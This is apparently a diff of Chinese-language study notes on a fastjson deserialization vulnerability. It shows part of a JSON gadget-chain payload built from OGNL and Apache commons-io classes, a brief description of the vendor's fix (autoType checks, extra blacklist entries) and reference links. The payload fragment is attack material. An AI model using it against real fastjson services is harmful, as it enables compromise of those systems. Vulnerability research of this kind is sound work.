+                            "@type": "org.apache.commons.io.ByteOrderMark",
+                            "charsetName": "UTF-8",
+                            "bytes": [
+                                36,82
+                            ]
+                        }]
+                    }
+                }
+            }
+        },
+        "su18": {
+            "@type": "ognl.Evaluation",
+            "node": {
+                "@type": "ognl.ASTMethod",
+                "p": {
+                    "@type": "ognl.OgnlParser",
+                    "stream": {
+                        "@type": "org.apache.commons.io.input.BOMInputStream",
+                        "delegate": {
+                            "@type": "org.apache.commons.io.input.ReaderInputStream",
+                            "reader": {
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.input"},
+        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.branch"},
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+                            "charsetName": "UTF-8",
+                            "bufferSize": 1024
+                        },
+                        "boms": [{
+                            "@type": "org.apache.commons.io.ByteOrderMark",
+                            "charsetName": "UTF-8",
+                            "bytes": [
+                                36,82
+                            ]
+                        }]
+                    }
+                }
+            }
+        },
+        "su19": {
+            "@type": "ognl.Evaluation",
+            "node": {
+                "@type": "ognl.ASTMethod",
+                "p": {
+                    "@type": "ognl.OgnlParser",
+                    "stream": {
+                        "@type": "org.apache.commons.io.input.BOMInputStream",
+                        "delegate": {
+                            "@type": "org.apache.commons.io.input.ReaderInputStream",
+                            "reader": {
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.input"},
+        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.branch"},
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+                            "charsetName": "UTF-8",
+                            "bufferSize": 1024
+                        },
+                        "boms": [{
+                            "@type": "org.apache.commons.io.ByteOrderMark",
+                            "charsetName": "UTF-8",
+                            "bytes": [
+                                36,82
+                            ]
+                        }]
+                    }
+                }
+            }
+        }    
+    }
+```  
+payload参考:https://mp.weixin.qq.com/s/SwkJVTW3SddgA6uy_e59qg
+### 修复
+在加入缓存时进行`checkAutoType`.  
+![](2023-01-20-13-08-06.png)    
+并在遇到异常类时直接return null,增加了一些黑名单.  
+![](2023-01-20-13-07-44.png)  
 ## 参考
-
-https://www.cnblogs.com/sijidou/p/13121332.html
-
-https://www.freebuf.com/vuls/208339.html
-
-https://xz.aliyun.com/t/7027
-
-https://xz.aliyun.com/t/7846
+https://www.cnblogs.com/sijidou/p/13121332.html  
+https://www.freebuf.com/vuls/208339.html  
+https://xz.aliyun.com/t/7027  
+https://xz.aliyun.com/t/7846  
+https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/  
+https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247486627&idx=1&sn=b768bebbd40c7d5b39071c711d9a19aa&scene=21#wechat_redirect  
+https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247484866&idx=1&sn=23fb7897f6e54cdf61031a65c602487d&scene=21#wechat_redirect  
+https://mp.weixin.qq.com/s/SwkJVTW3SddgA6uy_e59qg
